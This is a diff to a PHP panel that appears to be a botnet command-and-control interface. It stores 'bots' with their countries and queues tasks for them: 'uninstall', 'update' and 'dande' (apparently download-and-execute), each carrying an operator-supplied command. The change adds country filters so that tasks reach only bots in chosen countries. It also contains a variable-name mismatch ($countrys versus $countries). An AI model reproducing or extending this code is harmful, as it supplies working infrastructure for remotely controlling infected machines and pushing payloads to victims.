@@ -83,12 +83,19 @@ class Main{
                 $statement->execute(array($_POST["taskid"]));
             }
             if(!empty($_POST["task"])) {
+                $filter = array();
+                if(!empty($_POST["country-filter"])){
+                    $filter["country"] = implode(', ', $_POST['country-filter']);
+                }
                 if($_POST["task"] == "uninstall") {
                     $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
-                    $statement->execute(array('[]', 1, 'uninstall', $_POST["task"])); 
+                    $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"]));
                 } elseif($_POST["task"] == "dande" || $_POST["task"] == "update") {
+                    if(empty($_POST["command"])){
+                        die("Please Input a Command");
+                    }
                     $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
-                    $statement->execute(array('[]', 1, $_POST["command"], $_POST["task"])); 
+                    $statement->execute(array(json_encode($filter), 1, $_POST["command"], $_POST["task"]));
                 }
                 header("refresh: 0");
             }
@@ -107,7 +114,12 @@ class Main{
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                $allTasks[] = $row;
             }
+            $countrys = array();
+            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
+                $countries[] = $row["country"];
+            }
             $GLOBALS["tpl"]->assign("allTasks", $allTasks);
+            $GLOBALS["tpl"]->assign("countries", $countries);
         }
 
         public function login(){
